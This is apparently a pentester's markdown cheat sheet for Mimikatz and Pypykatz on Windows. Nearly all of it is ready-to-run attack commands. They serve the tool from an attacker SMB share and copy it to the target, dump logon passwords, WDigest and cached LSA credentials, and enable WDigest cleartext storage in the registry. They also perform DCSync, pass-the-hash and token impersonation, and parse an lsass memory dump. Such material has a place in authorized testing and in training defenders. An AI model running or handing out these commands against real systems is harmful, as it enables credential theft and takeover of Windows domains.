# Mimikatz

## Mimikatz

### Locate

```bash
$ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

### Host mimikatz

```bash
cd /usr/share/windows-resources/mimikatz/
impacket-smbserver share $(pwd) -smb2support
```

### Copy to Target

Copy to Target - x86

```cmd
xcopy \\<Kali IP>\share\Win32\mimikatz.exe C:\Temp\mimikatz\
```

Copy to Target - x64

```cmd
xcopy \\<Kali IP>\share\x64\mimikatz.exe C:\Temp\mimikatz\
```

### Get all available creds

```cmd
cd C:\Temp\mimikatz\
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
```

Only `wdigest`

```cmd
cd C:\Temp\mimikatz\
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::wdigest" exit
```

LSA cache

```cmd
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit
```

### Enabling wgigest

```bash
crackmapexec smb <Target_IP> -u '<username>' -p '<password>' -M wdigest -o ACTION=enable
```

OR

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

### runas

```cmd
runas /noprofile /user:<DOMAIN>\<USER> C:\Temp\mimikatz\mimikatz.exe
```

OR (example for DCSync)

```powershell
$SecPassword = ConvertTo-SecureString '<PWD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
Start-Process C:\Temp\mimikatz\mimikatz.exe -Credential $Cred -ArgumentList '"lsadump::dcsync /user:<DOMAIN>\<TARGET_USER>"'
```

PTH (pass the hash)

```powershell
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>" exit
```

Elevate (impersonate user)

```powershell
token::elevate /user:<USER>
```

## Pypykatz

Get secrets from memory dump

```bash
pypykatz lsa minidump --grep lsass.DMP
```

## Links

- [wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)
- [-wdigest-exploration](https://www.jimmwayans.com/mimikatz-exploration-wdigest/)
- [ERROR kuhl_m_sekurlsa_acquireLSA ; Key import](https://github.com/gentilkiwi/mimikatz/issues/248)